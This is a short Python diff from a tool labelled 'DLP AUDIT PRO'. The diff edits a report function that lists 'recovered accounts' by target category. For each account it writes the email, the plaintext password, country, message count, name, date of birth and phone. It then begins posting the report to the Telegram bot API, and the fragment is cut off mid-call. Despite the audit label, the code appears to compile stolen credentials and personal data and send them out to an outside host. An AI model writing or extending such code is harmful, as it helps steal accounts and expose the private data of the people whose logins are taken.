@@ -577,12 +577,15 @@ def send_consolidated_report(hits):
             f.write("DLP AUDIT PRO - REPORTE VPS\n")
             f.write("="*40 + "\n\n")
             for cat, items in categories.items():
+                f.write(f"📁 CARPETA / OBJETIVO MATCH: {cat}\n")
+                f.write(f"▼ {len(items)} CUENTAS RECUPERADAS ▼\n")
+                f.write("-" * 50 + "\n")
                 for h in items:
                     f.write(f"EMAIL: {h['email']} | PASS: {h['pass']}\n")
-                    f.write(f"PAIS: {h['country']} | NOMBRE: {h.get('name', 'N/A')}\n")
+                    f.write(f"PAIS: {h['country']} | MENSAJES: {h.get('messages', 'N/A')} | NOMBRE: {h.get('name', 'N/A')}\n")
                     f.write(f"DOB: {h.get('dob', 'N/A')} | TELEFONO: {h.get('phone', 'N/A')}\n")
                     f.write("-" * 50 + "\n")
-            f.write("\n")
+                f.write("\n\n")
 
         try:
             requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
